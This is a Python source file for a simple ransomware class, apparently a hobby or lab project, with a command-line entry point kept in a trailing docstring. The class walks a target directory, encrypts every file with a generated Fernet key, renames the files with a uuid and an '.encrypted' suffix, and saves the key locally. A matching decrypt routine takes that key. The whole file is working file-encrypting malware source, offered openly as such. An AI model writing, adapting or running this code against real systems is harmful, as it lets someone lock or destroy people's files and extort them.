from os.path import join
from os import rename, walk
from cryptography.fernet import Fernet, InvalidToken

PATH_TARGET='/home/noclick/Dev/Malwares/target'

class Ransomware():
    def __init__(self, args: dict) -> None:
        self._action = args.get('action')
        self._key = args.get('decrypt_key')
        self._abs_path = args.get('abs_path') if args.get('abs_path') else PATH_TARGET
        if self._action == 'encrypt':
            self.generate_uuid()
            self.generate_key()
            self.encrypt_root()
        elif self._action == 'decrypt':
            self.decrypt_root()


    def generate_uuid(self):
        from uuid import uuid4

        self._uuid = uuid4().__str__()


    def generate_key(self) -> None:
        from os import chmod
        from stat import S_IREAD, S_IRGRP, S_IROTH

        _key = Fernet.generate_key()
        _path_file = f'{self._uuid}.key'
        with open(_path_file, 'wb') as file:
            file.write(_key)
        chmod(_path_file, S_IREAD | S_IRGRP | S_IROTH)
        

    def fernet(self) -> Fernet:
        if self._action == 'decrypt':
            if self._key.__len__() == 44:
                return Fernet(self._key.encode())
        elif self._action == 'encrypt':
            with open(f'{self._uuid}.key', 'rb') as file:
                return Fernet(file.read())


    def encrypt_root(self) -> None:
        try:
            for dir, _, files in walk(self._abs_path):
                for file in files:
                    _abs_file_path = join(dir, file)
                    with open(_abs_file_path, 'rb') as file:
                        _data = file.read()
                        _enc_data = self.fernet().encrypt(_data)
                    with open(_abs_file_path, 'wb') as enc_file:
                        enc_file.write(_enc_data)
                    rename(_abs_file_path, f'{_abs_file_path}.{self._uuid}.encrypted')
                    print(f"{_abs_file_path} encrypted")
        except Exception as err:
            print('Error: '+err.__str__())
            exit(-1)


    def decrypt_root(self) -> None:
        try:
            for dir, _, files in walk(self._abs_path):
                for file in files:
                    _abs_file_path = join(dir, file)
                    if _abs_file_path.split('.')[-1] == 'encrypted':
                        self._uuid = _abs_file_path.split('/')[-1].split('.')[-2]
                        with open(_abs_file_path, 'rb') as enc_file:
                            _enc_data = enc_file.read()
                            _fernet = self.fernet()
                            if _fernet:
                                _data = _fernet.decrypt(_enc_data)
                            else:
                                print('Error: Invalid decrypt key')
                                exit(-1)
                        with open(_abs_file_path, 'wb') as dec_file:
                            dec_file.write(_data)
                        rename(_abs_file_path, f"{'.'.join(_abs_file_path.split('.')[:-2])}")
                        print(f"{_abs_file_path} decrypted")
        except InvalidToken:
            pass
          
""" main.py

from sys import argv
from malware import Ransomware
from argparse import ArgumentParser

if __name__ == '__main__':
    _action = dict(zip(argv[1::2], argv[2::2])).get('-A' or '--action')
    _dk_required = True if _action == 'decrypt' else False
    parser = ArgumentParser()
    parser.add_argument('-A', '--action', help='Action to execute', choices={'encrypt', 'decrypt'}, required=True)
    parser.add_argument('-D', '--decrypt-key', help='Key to decrypt files/path', required=_dk_required)
    parser.add_argument('-P', '--abs-path', help='Absolute path folder')
    Ransomware(vars(parser.parse_args()))
"""
